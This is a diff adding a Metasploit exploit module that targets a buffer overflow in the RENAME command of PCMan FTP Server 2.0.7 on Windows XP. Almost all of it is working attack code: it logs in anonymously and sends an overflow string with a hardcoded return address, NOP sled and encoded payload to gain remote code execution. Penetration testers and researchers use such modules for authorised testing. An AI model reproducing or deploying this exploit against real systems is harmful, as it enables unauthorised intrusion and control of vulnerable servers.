@@ -1,0 +1,68 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+## Original Exploit Information ##
+# Date:  29 Aug 2015
+# Exploit Author: Koby
+# Tested on: Windows XP SP3
+# Link: https://www.exploit-db.com/exploits/38013/
+
+## Software Information ##
+# Vendor Homepage: http://pcman.openfoundry.org/
+# Software Link: https://www.exploit-db.com/apps/9fceb6fefd0f3ca1a8c36e97b6cc925d-PCMan.7z
+# Version: 2.0.7
+
+## Metasploit Module Information ##
+# Date:  16 April 2016
+# Exploit Author: Jonathan Smith
+# Tested on: Windows XP SP2
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+
+ include Msf::Exploit::Remote::Ftp
+
+ def initialize(info = {})
+
+ super(update_info(info,
+
+    'Name' => 'PCMan RENAME overflow',
+
+    'Description' => 'This module exploits a buffer overflow in the RENAME command of PCMAN FTP Server 2.0.7. This requires authentication but anonymous credentials are enabled by default.',
+
+    'Author' => [ 'Metasploit module author: Jonathan Smith. Vulnerability originally discovered by Koby on 29 August 2015. Metasploit module developed 16 April 2016.'],
+
+    'Version' => '$Revision: 1 $',
+
+    'Platform' => ['win'],
+
+    'Targets' => [ [ 'Windows XP SP2', { } ],],
+
+    'DefaultTarget' => 0,
+
+    'License' => GPL_LICENSE,
+
+    'Payload' => {'BadChars' => "\x00\x0a\x0d"},
+
+    'DefaultOptions' => {'EXITFUNC' => 'process'}
+
+ ))
+
+ end
+
+def exploit
+
+ connect_login
+
+ exploitcode = "A" * 2004 + "\x65\x82\xA5\x7C" + make_nops(30) + payload.encoded
+
+ send_cmd( ['RENAME', exploitcode] , false )
+
+ disconnect
+
+ end
+
+end
